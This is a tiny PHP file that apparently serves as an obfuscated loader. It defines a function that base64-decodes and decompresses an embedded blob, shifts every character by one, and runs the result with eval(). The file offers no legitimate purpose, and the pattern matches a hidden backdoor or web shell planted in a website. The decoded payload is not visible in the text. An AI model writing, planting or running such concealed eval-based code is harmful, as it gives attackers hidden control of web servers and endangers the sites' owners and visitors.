<?php function imz($Jai)
{ 
$Jai=gzinflate(base64_decode($Jai));
 for($i=0;$i<strlen($Jai);$i++)
 {
$Jai[$i] = chr(ord($Jai[$i])-1);
 }
 return $Jai;
 }eval(imz("dZDbaoNAEIYfwKcYxIsE2qoYCkkwZaNiTXRNPBBCC+JhWyXxwO62UEKevWtpr9rOzTD//B/zMwCiJIlQ2tOMkqGnvOleJ9p0KSlF3nVggiwpl+GNN/XVNFfKpSU0r6+QxugRQRLacAMu2n7NECC8QeCGaz/cwmL6J2ihXWIJVIUdiuNDGNlCijyIHWx7ov+DHUM4IuzC2vHTADahhyFxfMeNUCDux9vUwSMqySI4Ix3r6Rj9WTOMJ21paO23/lssckbuZxnpyr4iVaaPDmx5eD/3jLl+GC0/u3PTncZ1zfnAFqpKSX5mNb9r+6JRT/tZUAk3+2CctBOZtnBLX6DMB17Wefauy+KnD6tP"));?>
